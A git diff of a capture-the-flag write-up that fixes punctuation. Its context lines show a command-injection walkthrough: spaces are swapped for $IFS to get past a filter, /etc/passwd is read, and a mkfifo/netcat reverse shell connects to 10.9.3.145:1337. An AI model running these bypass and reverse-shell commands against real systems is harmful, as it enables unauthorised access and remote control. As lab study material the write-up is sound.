@@ -5,7 +5,7 @@
 
 Hi guys ,
 <br> let's root another fun box today.
-<br> let's get start
+<br> let's get started.
 
 <h2>Nmap scan</h2>
 
@@ -38,7 +38,7 @@ proceeding further we noticed that our commands ain't working due to some kinda 
  
  ![filter](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/01e4e271-345e-4135-b128-838ec0d753d5)
 
-i found out that spaces get filtered and thereby triggering the alert
+i found out that spaces get filtered and thereby triggering the alert.
 
 <br> so, let's bypass the filter using the "internal field separator" $IFS
 ```
@@ -49,7 +49,7 @@ cat$IFS/etc/passwd should work
 
 dope! it has been bypassed. which means we have to replace the spaces with $IFS 
 
-<br> let's pop our sweet reverse shell by starting netcat listener and executing this commands
+<br> let's pop our sweet reverse shell by starting netcat listener and executing this commands.
 ```
 rm$IFS/tmp/f;mkfifo$IFS/tmp/f;cat$IFS/tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f
 ```
